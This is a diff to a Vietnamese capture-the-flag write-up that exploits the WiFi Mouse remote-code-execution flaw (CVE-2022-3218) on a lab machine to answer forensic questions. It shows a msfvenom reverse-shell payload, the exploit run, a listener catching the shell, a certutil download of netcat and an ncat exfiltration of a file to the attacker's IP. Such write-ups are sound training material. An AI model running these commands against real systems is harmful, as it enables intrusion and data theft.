@@ -112,3 +112,142 @@ Copied to: /root/49601.py
 ┌─[root@hackerbox]─[~]
 └──╼ #chmod +x 49601.py 
 ```
+### CVE-2022-3218 – WiFi Mouse Remote Code Execution
+- 1. WiFi Mouse là gì?
+
+WiFi Mouse là một ứng dụng cho Windows/Android/iOS cho phép biến điện thoại thành chuột & bàn phím không dây.
+
+Máy tính chạy WiFi Mouse server (mở port 1978 TCP).
+
+Điện thoại kết nối đến server này để gửi lệnh điều khiển (di chuyển chuột, gõ phím…).
+
+- 2. Lỗ hổng (Vulnerability)
+
+Vấn đề nằm ở dịch vụ trên port 1978.
+
+Server không có xác thực → bất kỳ ai trong cùng mạng có thể kết nối.
+
+Các lệnh gửi đến service được xử lý trực tiếp, trong đó có lệnh chạy file thực thi.
+
+Kẻ tấn công có thể gửi payload tùy ý để thực thi mã từ xa (RCE).
+- Sau đí tôi tạo 1 payload revshell
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.34.216 LPORT=4445 -f exe -o payload.exe
+```
+- 49601.py là 1 file chạy bằng python2 , nó lợi dụng lỗ hỏng để yêu cầu mục tiêu tải revshell về
+```
+  ┌──(kai0kid㉿Kai0Kid)-[~/Temp]
+└─$ python3 -m http.server 80 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
+ trước khi khởi động thì ta cần mở 1 cổng lắng nghe , có rất nhiều cách như sài nc hoặc các công cụ khác nhưng tôi chọn msfconsole 
+```
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PaYLOAD windows/x64/shell_reverse_tcp
+PaYLOAD => windows/x64/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.8.34.216
+LHOST => 10.8.34.216
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4445
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.8.34.216:4445
+```
+- Sau đó tôi bắt đầu khởi động CVE :
+```
+python2 49601.py 172.20.15.149 10.8.34.216 payload.exe #172.20.15.149 là ip mục tiêu , 10.8.34.216 là ip kẻ tấn công
+[+] 3..2..1..
+[+] *Super fast hacker typing*
+[+] Retrieving payload
+[+] Done! Check Your Listener?
+```
+- Kết quả là tôi nhận được shell
+```
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.8.34.216:4445 
+[*] Command shell session 1 opened (10.8.34.216:4445 -> 172.20.15.149:51133) at 2025-09-20 09:45:20 +0700
+
+Shell Banner:
+Microsoft Windows [Version 10.0.19045.3930]
+-----
+
+C:\Windows\system32>whoami
+whoami
+desktop-bg4o059\harry
+```
+- Để trả lời cho câu hỏi trên tôi đã dùng
+```
+C:\Windows\system32>findstr /I "\.hv" "C:\Users\Harry\Desktop\response.txt"
+findstr /I "\.hv" "C:\Users\Harry\Desktop\response.txt"
+Access-Control-Allow-Origin: https://trustbank.hv
+```
+==> Đáp án là **trustbank.hv**
+
+---
+
+## What is the number of compromised user data?
+```
+C:\Windows\system32>findstr /I "email" "C:\Users\Harry\Desktop\response.txt" | find /c /v ""
+findstr /I "email" "C:\Users\Harry\Desktop\response.txt" | find /c /v ""
+15689
+```
+==> Đáp án là **15689**
+
+---
+
+## What are any of the other websites targeted by the hacker group?
+```
+C:\Users\Harry\Documents\hack>type target_domains.txt
+type target_domains.txt
+primelogistics.hv
+swiftsolutions.hv
+serenewellness.hv
+summitfinancialgroup.hv
+creativemedia.hv
+```
+==> Đáp án là : **primelogistics.hv**
+
+---
+
+## What is the group participation link to the platform on which the hacker group communicates?
+
+```
+C:\Users\Harry\Desktop>type telegram.txt
+type telegram.txt
+t.me/+37NnWAZY2HTaYjM9A
+```
+==> Đáp án la : **t.me/+37NnWAZY2HTaYjM9A**
+
+---
+
+## What is the MD5 hash value of the malware used by the hacker group?
+
+- Chuẩn bị nc64.exe cho Windows trên máy Kali (dùng Python HTTP server để phục vụ file). Công cụ này sẽ được tải xuống máy victim để dùng cho việc truyền file.
+```
+certutil -urlcache -f http://<my-ip>/nc64.exe C:\Windows\Temp\ncat.exe
+```
+- Thiết lập listener trên cổng 9001 để chờ nhận file
+```
+nc -lvnp 9001 > malware.zip
+```
+- Trên victim, dùng ncat.exe để gửi file malware.zip về cho Kali:
+```
+C:\Windows\Temp\ncat.exe 10.8.33.97 9001 < C:\Users\Harry\Downloads\malware.zip
+```
+- Crack mật khẩu của file zip bằng John the Ripper
+```
+zip2john malware.zip > malware.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt malware.hash
+```
+> Kết quả: mật khẩu là money.
+- Giải nén:
+```
+unzip -P 'money' malware.zip
+md5sum malware.exe
+035bce7b8ecd5e46298e2666c5ba2fb2  malware.exe
+
+```
+> ==> Đáp án là : **035bce7b8ecd5e46298e2666c5ba2fb2**
+
+
